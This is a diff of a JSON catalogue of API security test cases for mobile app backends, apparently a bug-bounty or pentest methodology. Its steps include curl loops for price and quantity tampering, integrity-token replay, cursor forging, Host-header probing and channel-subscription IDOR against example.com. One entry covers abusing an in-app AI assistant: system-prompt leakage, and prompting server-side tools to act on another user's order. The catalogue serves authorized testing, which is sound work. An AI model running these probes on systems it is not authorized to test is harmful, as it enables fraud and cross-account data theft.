-   "how": "Place a real **low-value, own** order, then tamper the in-flight request in this order, recording the\nserver's decision each time: (1) reduce `amount`; (2) set it to `0`; (3) negative; (4) string `\"1\"`;\n(5) float with many decimals `0.0000001`; (6) both the tampered and original key (`amount` and `Amount`, or\nduplicate JSON keys).\n```bash\ncurl -s -i -X POST https://api.example.com/v1/orders/place -H \"Authorization: Bearer $TOKEN\" \\\n  -H 'Content-Type: application/json' -d '{\"cartId\":\"'\"$C\"'\",\"amount\":1,\"currency\":\"INR\"}'\nfor q in 0 -1 -1000 2147483647 2147483648 9223372036854775807 1e309 0.5 \"1\"; do\n  printf '%-22s -> ' \"$q\"\n  curl -s -o /tmp/r.json -w '%{http_code}' -X POST https://api.example.com/v1/cart/items \\\n    -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' \\\n    -d \"{\\\"sku\\\":\\\"$SKU\\\",\\\"quantity\\\":$q}\"; echo \" $(jq -r '.total // .error' /tmp/r.json)\"\ndone\n```",
+   "how": "Place a real **low-value, own** order, then tamper the in-flight request in this order, recording the\nserver's decision each time: (1) reduce `amount`; (2) set it to `0`; (3) negative; (4) string `\"1\"`;\n(5) float with many decimals `0.0000001`; (6) both the tampered and original key (`amount` and `Amount`, or\nduplicate JSON keys).\n```bash\ncurl -s -i -X POST https://api.example.com/v1/orders/place -H \"Authorization: Bearer $TOKEN\" \\\n  -H 'Content-Type: application/json' -d '{\"cartId\":\"'\"$C\"'\",\"amount\":1,\"currency\":\"INR\"}'\nfor q in 0 -1 -1000 2147483647 2147483648 9223372036854775807 1e309 0.5 '\"1\"' '\"1e2\"' true null; do   # single-quote the JSON literals so they reach the body verbatim\n  printf '%-22s -> ' \"$q\"\n  curl -s -o /tmp/r.json -w '%{http_code}' -X POST https://api.example.com/v1/cart/items \\\n    -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' \\\n    -d \"{\\\"sku\\\":\\\"$SKU\\\",\\\"quantity\\\":$q}\"; echo \" $(jq -r '.total // .error' /tmp/r.json)\"\ndone\n```",
    "proof": "The server's **accept/reject decision** and the resulting order record's stored amount, fetched\nback with a separate GET. Screenshot the cart in the app showing the impossible state. **Stop at the\ndecision — do not complete a fraudulent payment.**",
    "escalation": "A negative quantity on a *refundable* line item is a money-printing loop: check whether the\nrefund path pays out the negative amount. → D23.",
    "ruled_out_when": "The order record read back carries the server's own price for every money-adjacent key\nand every numeric edge case is rejected or clamped at the **capture** step, not just at the cart step. The FP\ntrap is explicit: many cart APIs accept arbitrary client state while payment capture rejects it — *\"negative\nprice accepted in the cart\"* is not a bug, the cart display is fiction."
@@ -3636,7 +3754,7 @@
    "severity": "critical",
    "severity_floor": "critical",
    "severity_note": "Critical",
-   "vrt": "no dedicated VRT leaf; `broken_access_control.privilege_escalation` (VARIES) where a stage runs as another principal",
+   "vrt": "no dedicated VRT leaf; `broken_access_control.privilege_escalation` (varies) where a stage runs as another principal",
    "vrt_priority": "varies",
    "vrt_best": "varies",
    "attacker": "AM-05",
@@ -3774,7 +3892,7 @@
    "severity": "high",
    "severity_floor": "medium",
    "severity_note": "High (when the enforced update is the mitigation for a known client-side vulnerability — you are re-enabling a patched bug); Medium otherwise",
-   "vrt": "`broken_access_control.privilege_escalation` (VARIES) as the nearest node",
+   "vrt": "`broken_access_control.privilege_escalation` (varies) as the nearest node",
    "vrt_priority": "varies",
    "vrt_best": "varies",
    "attacker": "AM-05 / AM-12",
@@ -3866,17 +3984,21 @@
      "broken_authentication_and_session_management.authentication_bypass"
     ]
    },
-   "xrefs": [],
+   "xrefs": [
+    "D15-091",
+    "D21-016",
+    "D21-022"
+   ],
    "domain_refs": [
     "D12",
-    "D20"
+    "D21"
    ],
    "has_code": true,
    "skip_when": "",
-   "test": "Four claims the client makes and the server usually fails to verify, tested as one battery.\n(a) **A request signature or app-layer encryption** — recover the key (D12) or hook the crypto boundary, then\ntamper the plaintext freely. (b) **A device id used as authorisation** (`ANDROID_ID`, FCM token, advertising\nid, an install UUID) — replay another install's identifier. (c) **A Play Integrity verdict** — replay it,\nstrip it, or check whether `requestHash`/`nonce` is bound to the request body at all. (d) **A dead\ncontrol**: SafetyNet Attestation was fully turned down in **January 2025** and now always invokes the failure\nlistener with status code 7 (`NETWORK_ERROR`), so an app that treats failure as \"network problem, allow\" has\na permanently open gate.",
-   "how": "```bash\n  grep -rnE 'IntegrityManager|StandardIntegrityManager|requestIntegrityToken|integrityToken|setNonce\\(|setRequestHash\\(' $S\n  grep -rn 'SafetyNet\\|SafetyNetClient\\|attest(' $S -A8 | grep -in 'addOnFailureListener\\|catch\\|allow'\n  unzip -l base.apk | grep -i safetynet\n  grep -RnE 'Settings\\.Secure\\.ANDROID_ID|getAndroidId|FirebaseInstanceId|getToken\\(|AdvertisingIdClient|X-Device|X-Api-Key' $S\n```\nThen, at the API: remove the header entirely; replay a valid verdict from a clean device on a rooted one;\nsend an obviously invalid verdict; and capture two requests with **different bodies** and compare their\n`requestHash` — if identical, content binding is absent and you can relay a clean-device token alongside a\nmodified request.\n```javascript\n// recover the plaintext under app-layer encryption, then tamper and re-encrypt\n// hook javax.crypto.Cipher.doFinal(byte[]) on both paths and log with backtraces\n```",
+   "test": "Four claims the client makes and the server usually fails to verify, tested as one battery.\n(a) **A request signature or app-layer encryption** — recover the key (D12) or hook the crypto boundary, then\ntamper the plaintext freely. (b) **A device id used as authorisation** (`ANDROID_ID`, FCM token, advertising\nid, an install UUID) — replay another install's identifier. (c) **A Play Integrity verdict** — replay it or\nstrip it; whether `requestHash` is bound to the request body is **D21-016** — consume its verdict here, do\nnot re-test it. Headers under (b)/(c) minted by another process (D15-091) are platform-to-server claims:\nrecord \"tests platform-to-server\" and do not score them against the app. (d) **A dead\ncontrol**: SafetyNet Attestation was fully turned down in **January 2025** and now always invokes the failure\nlistener with status code 7 (`NETWORK_ERROR`), so an app that treats failure as \"network problem, allow\" has\na permanently open gate.",
+   "how": "```bash\n  grep -rnE 'IntegrityManager|StandardIntegrityManager|requestIntegrityToken|integrityToken|setNonce\\(|setRequestHash\\(' $S\n  grep -rn 'SafetyNet\\|SafetyNetClient\\|attest(' $S -A8 | grep -in 'addOnFailureListener\\|catch\\|allow'\n  unzip -l base.apk | grep -i safetynet\n  grep -RnE 'Settings\\.Secure\\.ANDROID_ID|getAndroidId|FirebaseInstanceId|getToken\\(|AdvertisingIdClient|X-Device|X-Api-Key' $S\n```\nThen, at the API: remove the header entirely; replay a valid verdict from a clean device on a rooted one;\nsend an obviously invalid verdict. Content binding (two bodies, one `requestHash`) is D21-016's test — cite\nits row rather than repeating it.\n```javascript\n// recover the plaintext under app-layer encryption, then tamper and re-encrypt\n// hook javax.crypto.Cipher.doFinal(byte[]) on both paths and log with backtraces\n```",
    "proof": "A 200 with the attestation header removed, or the same integrity token accepted twice for\ndifferent operations, or the server accepting device A's token with device B's request body, or a modified\nplaintext (changed amount, changed object id) re-encrypted and accepted. A privileged API response returned\nto plain `curl` from a host that never ran the app is the cleanest form.",
-   "escalation": "With attestation bypassed, every \"requires a modified client\" caveat disappears from your\nother findings — restate their severity accordingly. Be explicit in the report that \"no application-layer\nencryption\" is a MAS-R hardening item and **Informational** on most programs; the finding is what you do once\ninside it. Beware the opposite leak: data in `nonce`/`requestHash` is \"visible in cleartext to your app and\nGoogle\", so a nonce carrying an email or a bearer token is its own disclosure (→ D20).",
+   "escalation": "With attestation bypassed, every \"requires a modified client\" caveat disappears from your\nother findings — restate their severity accordingly. Be explicit in the report that \"no application-layer\nencryption\" is a MAS-R hardening item and **Informational** on most programs; the finding is what you do once\ninside it. The opposite leak — PII or a bearer inside `nonce`/`requestHash` — is D21-022.",
    "ruled_out_when": "The server rejects requests with the verdict absent, replayed or content-mismatched;\n`requestHash` changes with the body; the four documented baseline checks are all performed server-side; the\nsignature key is server-issued and non-exportable; and no SafetyNet dependency ships. Anything less, name\nwhich check is missing."
   },
   {
@@ -3886,7 +4008,7 @@
    "severity": "critical",
    "severity_floor": "high",
    "severity_note": "Critical for money/credit; High for entitlement",
-   "vrt": "`server_security_misconfiguration.race_condition` (VARIES)",
+   "vrt": "`server_security_misconfiguration.race_condition` (varies)",
    "vrt_priority": "varies",
    "vrt_best": "varies",
    "attacker": "AM-05",
@@ -3941,8 +4063,10 @@
     "AM-01"
    ],
    "applies_to": "all. **The clearest example of \"mobile-only endpoints the web app does not expose\"**",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "API4:2023 Unrestricted Resource Consumption; NIST SP 800-63B §5.2.2 (verifiers **shall** limit consecutive failed attempts on a single account to no more than 100); Mobile Top 10 2024 M8; ATT&CK T1636.004",
    "record": "",
    "legacy_meta": {},
@@ -4075,7 +4199,7 @@
    "severity": "high",
    "severity_floor": "low",
    "severity_note": "High when it bypasses an authorisation or validation control; Low when it only changes the error format",
-   "vrt": "`broken_access_control.privilege_escalation` (VARIES) when it bypasses a control",
+   "vrt": "`broken_access_control.privilege_escalation` (varies) when it bypasses a control",
    "vrt_priority": "varies",
    "vrt_best": "varies",
    "attacker": "AM-02 / AM-05",
@@ -4177,6 +4301,379 @@
    "proof": "A deterministic oracle — a 5 s delay reproduced 3/3 against a sub-300 ms baseline, or `49`\nreturned for `{{7*7}}` — or, for SSRF, **an out-of-band interaction from the target's egress IP**.\n**OOB-or-it-didn't-happen:** a URL echoed in a 500, a stack trace naming your URL (thrown by a *parser*, not\na network library), a client-side fetch (browser UA, victim IP), and timing differences are all non-findings\nwithout the callback. \"SSRF DNS callback only\" is itself on the never-submit list — carry it to metadata or\nan internal service. Verbose errors (stack traces, SQL fragments, internal hostnames) are Low alone; report\nthem through what they enable.",
    "escalation": "Metadata credentials → D18 cloud account. A stored URL in a profile field that a cron or\navatar job fetches later is the second-order variant that defeats scanners. A stored payload delivered back\ninto the app's WebView is client-side XSS with bridge access → D10.",
    "ruled_out_when": "D15-026's error-oracle table shows byte-identical responses for every non-payload variant\nat the parameter (injection structurally ruled out), *and* every URL-bearing parameter produces no\ncollaborator interaction across 20+ tagged payloads with a working positive control. Record the payload count\nand the tag scheme; \"we tried some payloads\" is not a negative."
+  },
+  {
+   "id": "D15-091",
+   "domain": "D15",
+   "title": "Attribute every observed backend flow to the process and client stack that issued it",
+   "severity": "support",
+   "severity_floor": "support",
+   "severity_note": "Support (decides scope and attribution for the whole chapter)",
+   "vrt": "n/a (enabler)",
+   "vrt_priority": "n/a",
+   "vrt_best": "n/a",
+   "attacker": "AM-12 harness",
+   "attacker_ids": [
+    "AM-12"
+   ],
+   "applies_to": "all; mandatory when D15-001 and D15-007 both return zero routes while the proxy shows traffic, and for any app that delegates identity, payments or sync to a platform or vendor service",
+   "requires": "backend-api, device, mitm",
+   "requires_tags": [
+    "backend-api",
+    "device",
+    "mitm"
+   ],
+   "maps_to": "API9:2023 Improper Inventory Management; MASTG-TECH-0010",
+   "record": "logs/D15-091.txt (the `ss -tnp` output and the flow table); inventory/d15-probe.txt",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TECH-0010"
+    ],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D15-001",
+    "D15-007",
+    "D15-084"
+   ],
+   "domain_refs": [
+    "D11",
+    "D23"
+   ],
+   "has_code": true,
+   "skip_when": "`adb -s \"$SERIAL\" shell 'ss -tnp' | grep -c \"pid=$PID,\"` ≥ 1 **and** every proxied flow's\nUser-Agent names the app — write `D15-091 n/a — all TLS sockets in the window belong to the app's PID; UA\ntable attached` and proceed to D15-001 unmodified.",
+   "test": "Before mapping any endpoint to the target APK, prove which process opened the socket and which\nclient stack built the request. Apps that hand their backend calls to a privileged platform service over\nbinder/AIDL produce traffic whose User-Agent, bearer and integrity headers belong to that service, not to\nthe app; everything from D15-001 onward would then be testing the wrong principal.",
+   "how": "```bash\n  PID=$(adb -s \"$SERIAL\" shell pidof -s \"$PKG\"); UID_=$(adb -s \"$SERIAL\" shell dumpsys package \"$PKG\" | grep -oE 'userId=[0-9]+' | head -1)\n  adb -s \"$SERIAL\" shell 'ss -tnp' | grep -E \"pid=$PID,\"                       # sockets the app's own process owns\n  adb -s \"$SERIAL\" shell 'ss -tnp' | grep -vE \"pid=$PID,\" | grep ':443'         # everything else talking TLS in the same window\n  # mitmproxy's client_conn.address only names the device: attribute by UA + request-context header + timing against the ss output\n  mitmdump -nr flows.mitm -s /dev/stdin <<'PY'\n  from mitmproxy import http\n  def response(f: http.HTTPFlow):\n      print(f.request.host, f.request.path[:60], f.request.headers.get('user-agent', '')[:40])\n  PY\n  grep -rnE 'ServiceConnection|asInterface\\(|IBinder|bindService\\(' \"$S\" | grep -iE 'pay|wallet|auth|sync|account|identity' | head\n```",
+   "proof": "A table `HOST · PATH · USER-AGENT · PID/UID · OWNER (target APK | platform service | SDK)` with at\nleast one row per host. Rows owned by another process are tagged and either moved into scope explicitly\n(`engagement.json` `authorisation.scope`) or recorded as out of scope.",
+   "escalation": "Platform-service-owned rows feed the sibling-package question (D23, D11 delegated store);\napp-owned rows proceed to D15-001. Integrity/attestation headers minted by another process invalidate\nD15-084 (b)/(c) for the app — record \"tests platform-to-server\".",
+   "ruled_out_when": "Every TLS socket in the exercise window belongs to the app's own PID and every flow's\nUser-Agent/request-context names the app, shown by the `ss -tnp` capture and the flow table. Then D15-001\napplies unmodified."
+  },
+  {
+   "id": "D15-092",
+   "domain": "D15",
+   "title": "Find the compiled-in environment table and prove its selector is not attacker-writable",
+   "severity": "critical",
+   "severity_floor": "low",
+   "severity_note": "Critical (bearer sent to an attacker-selected or cleartext host); Low for the table alone",
+   "vrt": "`broken_authentication_and_session_management.authentication_bypass` (P1) when the selected host receives a live bearer; `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints` (P4) for the exposure alone",
+   "vrt_priority": "P1",
+   "vrt_best": "P1",
+   "attacker": "AM-02 / AM-03",
+   "attacker_ids": [
+    "AM-02",
+    "AM-03"
+   ],
+   "applies_to": "any release build with more than one base URL compiled in (a PROD/STAGING/DEV/LOCAL enum, often with a cleartext `localhost` row)",
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
+   "maps_to": "API9:2023; API8:2023; MASTG-TECH-0022",
+   "record": "logs/D15-092.txt (the table and the selector's source); requests/E-NNN.http for the redirected request",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TECH-0022"
+    ],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "broken_authentication_and_session_management.authentication_bypass",
+     "cloud_security.misconfigured_services_and_apis.insecure_api_endpoints"
+    ]
+   },
+   "xrefs": [],
+   "domain_refs": [
+    "D11",
+    "D14",
+    "D17",
+    "D18"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -rhoE 'https?://[A-Za-z0-9._-]+' \"$S\" | sort -u | wc -l` ≤ 1 and the `(PROD|STAGING|DEV|LOCAL)`\ngrep below is empty — write `D15-092 n/a — one compiled-in base URL, no environment enum`.",
+   "test": "Release builds ship an environment enum. The finding is not the table — it is the **selector**: a\nremote-config flag, a DataStore/SharedPreferences key, a system setting, a deep-link extra or a debug\nreceiver that picks the row. If any principal weaker than the app can flip it, every subsequent request\n(with its bearer) goes where they say, often over cleartext.",
+   "how": "```bash\n  grep -rnE 'https?://(localhost|127\\.0\\.0\\.1|10\\.|192\\.168\\.)' \"$S\" | head\n  grep -rnE '(PROD|PRODUCTION|STAGING|STAGE|DEV|QA|LOCAL|SANDBOX)[\"_A-Z]*\\s*[,(=]' \"$S\" | grep -iE 'http|url|host|endpoint' | head -30\n  # who reads the selector: follow the enum's consumer to its source\n  grep -rnE 'getString\\(\"(env|environment|server|backend|api_?host|base_?url)|Settings\\.(Global|Secure|System)\\.getString\\(.*(env|server|host)' \"$S\" | head\n  adb -s \"$SERIAL\" shell 'settings list global; settings list secure' | grep -iE 'env|server|host|endpoint'\n```\nThen attempt the write with the weakest principal: a zero-permission app sending the extra/broadcast\n(AM-03), a remote-config value if the config endpoint is unauthenticated (D14/D17/D18); `adb shell settings\nput` is only the upper bound, never AM-03 proof.",
+   "proof": "The app's next request observed on the proxy going to the selected host, carrying the session\nbearer, after a write performed by the weaker principal — plus the cleartext case shown on the wire.",
+   "escalation": "Cleartext host + bearer = token theft on any shared network (→ D14, AM-06); attacker host =\nfull MITM without a CA; a `localhost` row = a loopback listener on the device captures the bearer (→ D11/D17).",
+   "ruled_out_when": "The selector is a `BuildConfig` constant resolved at compile time, or every runtime source\nis private to the app and not reachable from an exported component, deep link or unauthenticated config —\neach path named at `file:line`."
+  },
+  {
+   "id": "D15-093",
+   "domain": "D15",
+   "title": "Realtime channel subscription keyed on a guessable identifier",
+   "severity": "critical",
+   "severity_floor": "critical",
+   "severity_note": "Critical (live location, messages, OTP-bearing events)",
+   "vrt": "`broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3); `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when the channel accepts client publishes",
+   "vrt_priority": "P3",
+   "vrt_best": "P1",
+   "attacker": "AM-05",
+   "attacker_ids": [
+    "AM-05"
+   ],
+   "applies_to": "apps with chat, live tracking, order status or collaborative state over WebSocket, MQTT, Socket.IO or a hosted pub/sub SDK",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "API1:2023; API5:2023; CWE-862",
+   "record": "logs/D15-093.txt (the subscribe handshake pair); requests/E-NNN.http",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-862"
+    ],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers",
+     "broken_access_control.idor.view_sensitive_information_iterable_object_identifiers"
+    ]
+   },
+   "xrefs": [
+    "D15-029",
+    "D15-056"
+   ],
+   "domain_refs": [
+    "D10",
+    "D13"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -rlE 'okhttp3\\.WebSocket|newWebSocket\\(|io\\.socket|PusherOptions|AblyRealtime|MqttAndroidClient' \"$S\" | wc -l`\nis 0 and the proxy shows no `101 Switching Protocols` — write `D15-093 n/a — no realtime channel in the client`.",
+   "test": "Subscribe, from account A's connection, to the channel the client derives for account B's object\n(`order_<id>`, `private-user-<id>`, `chat/<roomId>`, MQTT `users/<id>/#`). The subscribe-auth callback\n(`/pusher/auth`-style endpoints, a token request, a Socket.IO `join`) must check ownership of the *channel\nname*, not just that the caller is logged in. This is the server-side analogue of D15-056.",
+   "how": "```bash\n  grep -rnE 'okhttp3\\.WebSocket|newWebSocket\\(|Socket\\.IO|io\\.socket|PusherOptions|subscribePrivate|AblyRealtime|MqttAndroidClient|subscribe\\(\"' \"$S\" -B2 -A6 | head -60\n  # replay the auth handshake with B's channel name under A's token\n  curl -s -X POST https://api.example.com/pusher/auth -H \"Authorization: Bearer $TOKEN_A\" -d \"socket_id=$SOCK&channel_name=private-user-$ID_B\"\n  websocat -H \"Authorization: Bearer $TOKEN_A\" wss://rt.example.com/socket     # then send the subscribe frame with B's channel\n```",
+   "proof": "An event carrying account B's marker (D15-029) delivered on account A's connection; for MQTT, a\nretained message from B's topic.",
+   "escalation": "Publish to the channel (client-writable channels) → forged order status / injected chat →\nD10 if rendered as HTML; OTP-bearing events → D13.",
+   "ruled_out_when": "The auth callback rejects a channel name not owned by the session with a distinct body,\nwildcard subscriptions (`#`, `*`) are refused, and the channel name is a server-issued high-entropy value the\nclient never derives — each shown on the wire."
+  },
+  {
+   "id": "D15-094",
+   "domain": "D15",
+   "title": "Model-proxy endpoints: metering, prompt/tool disclosure and server-side tool authorisation",
+   "severity": "critical",
+   "severity_floor": "high",
+   "severity_note": "Critical when a server-side tool acts on another user's object; High for unmetered cost",
+   "vrt": "`sensitive_data_exposure.disclosure_of_secrets.pay_per_use_abuse` (P4) for metering; `ai_application_security.prompt_injection.system_prompt_leakage` (P2) for the prompt; `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) for a tool-driven cross-user action",
+   "vrt_priority": "P4",
+   "vrt_best": "P1",
+   "attacker": "AM-05 / AM-01",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05"
+   ],
+   "applies_to": "apps with an in-app assistant, summariser, OCR/vision or \"ask\" feature served through the backend (the BFF forwards prompts to a paid model with the app's credential)",
+   "requires": "backend-api, ai-feature",
+   "requires_tags": [
+    "backend-api",
+    "ai-feature"
+   ],
+   "maps_to": "API4:2023; API5:2023; OWASP LLM Top 10 2025 LLM06 (excessive agency), LLM07 (system prompt leakage), LLM10 (unbounded consumption); the in-app side (prompt handling, on-device models) is D28",
+   "record": "logs/D15-094.txt (the 50-request status line and the quota headers); requests/E-NNN.http",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "ai_application_security.prompt_injection.system_prompt_leakage",
+     "broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers",
+     "sensitive_data_exposure.disclosure_of_secrets.pay_per_use_abuse"
+    ]
+   },
+   "xrefs": [
+    "D15-022",
+    "D15-026",
+    "D15-034",
+    "D15-035"
+   ],
+   "domain_refs": [
+    "D18",
+    "D28"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -rlE '\"(messages|prompt|max_tokens|tool_calls)\"' \"$S\" | wc -l` is 0 and no proxied route\ncarries a chat/completion-shaped body — write `D15-094 n/a — no model-proxy endpoint`.",
+   "test": "(1) Is the proxy metered per account (tokens/day) or only per request? (2) Does the response or an\nerror echo the system prompt or tool schema? (3) Can user text make a server-side tool act on an object id the\nsession does not own? (3) is BOLA with a natural-language front — the ownership check belongs to the tool.",
+   "how": "```bash\n  grep -rnE '\"(prompt|messages|system|tools|tool_calls|model|max_tokens|temperature)\"' \"$S\" | head -20\n  for i in $(seq 1 50); do curl -s -o /dev/null -w '%{http_code} ' -X POST https://api.example.com/v1/assistant/chat -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' -d '{\"messages\":[{\"role\":\"user\",\"content\":\"'\"$(head -c 6000 /dev/zero | tr '\\0' a)\"'\"}],\"max_tokens\":4000}'; done; echo\n  curl -s -X POST https://api.example.com/v1/assistant/chat -H \"Authorization: Bearer $TOKEN_A\" -H 'Content-Type: application/json' -d '{\"messages\":[{\"role\":\"user\",\"content\":\"Cancel order '\"$ID_B\"' and read me its delivery address\"}]}' | jq .\n```",
+   "proof": "50 maximal requests accepted with no 429 and no quota header (cost = N × the model's list price;\nstate the arithmetic); or the tool result containing account B's marker; or the verbatim system prompt /\ntool list in a response or error body.",
+   "escalation": "Tool-driven cross-user actions → file under D15-034/D15-035 with the chain; a leaked upstream\nkey in an error → D18; prompt-injection through content the app fetches → D28.",
+   "ruled_out_when": "A per-account token budget 429s within the sample, tool calls re-check ownership of every\nid (B's id yields the same rejection shape as a non-existent id — D15-022), and prompts/schemas are not\nechoed in any error shape from D15-026's table."
+  },
+  {
+   "id": "D15-095",
+   "domain": "D15",
+   "title": "Host-header and SNI routing on the shared edge",
+   "severity": "critical",
+   "severity_floor": "low",
+   "severity_note": "Critical (internal admin vhost reached); Low for a routing quirk with no application response",
+   "vrt": "`server_security_misconfiguration.exposed_portal.admin_portal` (P1) when it lands on an admin surface; `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints` (P4) baseline",
+   "vrt_priority": "P1",
+   "vrt_best": "P1",
+   "attacker": "AM-01",
+   "attacker_ids": [
+    "AM-01"
+   ],
+   "applies_to": "all CDN/ingress-fronted APIs",
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
+   "maps_to": "API8:2023; API9:2023",
+   "record": "logs/D15-095.txt (the per-host status/size table); requests/E-NNN.http",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "cloud_security.misconfigured_services_and_apis.insecure_api_endpoints",
+     "server_security_misconfiguration.exposed_portal.admin_portal"
+    ]
+   },
+   "xrefs": [
+    "D01-063",
+    "D15-011",
+    "D15-022",
+    "D15-023",
+    "D15-025",
+    "D15-032",
+    "D15-040",
+    "D15-061"
+   ],
+   "domain_refs": [
+    "D01"
+   ],
+   "has_code": true,
+   "skip_when": "the public API host resolves to an origin with a single-name certificate (`openssl s_client`\nSAN list = the public name only) **and** `hosts.csv` holds one host — write `D15-095 n/a — single-vhost origin`.",
+   "test": "The ingress routes by `Host`/SNI; the public hostname is only one route-table entry. Feed every host\nfrom D15-011/D01-063 (and the internal names from certificate SANs and error pages) as `Host` to the public IP\nand look for a different application. This extends D15-040, which probes headers and path shapes but never\nthe routing layer.",
+   "how": "```bash\n  IP=$(dig +short api.example.com | head -1)\n  openssl s_client -connect \"$IP:443\" -servername api.example.com </dev/null 2>/dev/null | openssl x509 -noout -ext subjectAltName | tr ',' '\\n' | sed 's/.*DNS://' > sans.txt\n  cat sans.txt hosts.csv | sort -u | while read -r h; do printf '%-40s ' \"$h\"; curl -s -o /tmp/o -w '%{http_code} %{size_download}\\n' --resolve \"$h:443:$IP\" \"https://$h/\"; done | tee logs/D15-095.txt\n  wc -l logs/D15-095.txt                                                       # count your results (D15-032)\n  curl -s -o /tmp/o -w '%{http_code}\\n' \"https://$IP/\" -H 'Host: admin.internal' -k   # Host ≠ SNI variant\n```",
+   "proof": "A body or `Server`/`X-Powered-By` set different from the public API's for a `Host` value the public\nDNS does not publish, plus one application response (login page, JSON error naming a service) — not a CDN\ndefault page.",
+   "escalation": "Run D15-022/D15-023/D15-061 against the new vhost; it is a new host in the inventory (D15-011).",
+   "ruled_out_when": "Every unknown `Host` returns the edge's default (identical body hash, D15-025) and the\nSAN-listed names all resolve to the same application."
+  },
+  {
+   "id": "D15-096",
+   "domain": "D15",
+   "title": "Opaque pagination cursor carrying the authorisation filter",
+   "severity": "critical",
+   "severity_floor": "critical",
+   "severity_note": "Critical (cross-tenant listing at scale)",
+   "vrt": "`broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3); `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) with a write path",
+   "vrt_priority": "P3",
+   "vrt_best": "P1",
+   "attacker": "AM-05",
+   "attacker_ids": [
+    "AM-05"
+   ],
+   "applies_to": "every paginated list endpoint that returns a `cursor`, `next`, `page_token` or similar opaque value",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "API1:2023; API3:2023; CWE-639",
+   "record": "logs/D15-096.txt (decoded cursor, tampered cursor, both responses); requests/E-NNN.http",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-639"
+    ],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers",
+     "broken_access_control.idor.view_sensitive_information_iterable_object_identifiers"
+    ]
+   },
+   "xrefs": [
+    "D15-010",
+    "D15-044",
+    "D15-045",
+    "D15-086"
+   ],
+   "domain_refs": [],
+   "has_code": true,
+   "skip_when": "`grep -ciE 'cursor|page_token|next_token' endpoints.txt` is 0 and no list response in the proxy\ncarries an opaque pagination value — write `D15-096 n/a — offset/limit pagination only` (then D15-045 covers it).",
+   "test": "Decode the cursor the server returns (base64 / JSON / protobuf / signed); if it names the owner,\ntenant, status or SQL offset, change that field — or swap in a cursor minted in account B's session — and\nrequest the next page under account A. D15-045 (`since=0`) and D15-044 (visible filter keys) do not reach\nthis: the filter is inside the cursor.",
+   "how": "```bash\n  CUR=$(curl -s \"https://api.example.com/v1/orders?limit=2\" -H \"Authorization: Bearer $TOKEN_A\" | jq -r '.next_cursor // .cursor // .page_token')\n  printf '%s' \"$CUR\" | base64 -d 2>/dev/null | head -c 400; echo            # protobuf? pipe it to the D15-010 decoder\n  NEW=$(printf '%s' \"$CUR\" | base64 -d | sed \"s/$ID_A/$ID_B/\" | base64 | tr -d '\\n')\n  curl -s \"https://api.example.com/v1/orders?cursor=$NEW\" -H \"Authorization: Bearer $TOKEN_A\" | grep -c \"$MARK\"\n  CUR_B=$(curl -s \"https://api.example.com/v1/orders?limit=2\" -H \"Authorization: Bearer $TOKEN_B\" | jq -r '.next_cursor')\n  curl -s \"https://api.example.com/v1/orders?cursor=$CUR_B\" -H \"Authorization: Bearer $TOKEN_A\" | grep -c \"$MARK\"\n```",
+   "proof": "Account B's marker in a page fetched under A's token via a tampered or transplanted cursor, with the\nfirst page under A (untampered) lacking it.",
+   "escalation": "Iterate the cursor → bulk extraction (stop at proof — D15-045's rule); combine with D15-086\n(one request per page).",
+   "ruled_out_when": "The cursor is signed/HMAC'd and a one-byte change is rejected with a distinct error, a\ncursor minted in B's session is refused under A's token, and the decoded cursor carries no principal field\n(offset only) while the page stays session-scoped (no foreign owner id across ten pages)."
+  },
+  {
+   "id": "D15-097",
+   "domain": "D15",
+   "title": "Batch/multiplex envelope: sub-requests that skip per-route authorisation and throttling",
+   "severity": "critical",
+   "severity_floor": "critical",
+   "severity_note": "Critical (a sub-request reaches a role-restricted or cross-account route)",
+   "vrt": "`broken_access_control.privilege_escalation` (varies); `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) per cross-account sub-request; `server_security_misconfiguration.no_rate_limiting_on_form.login` (P4) when the multiplier defeats an OTP/login limiter",
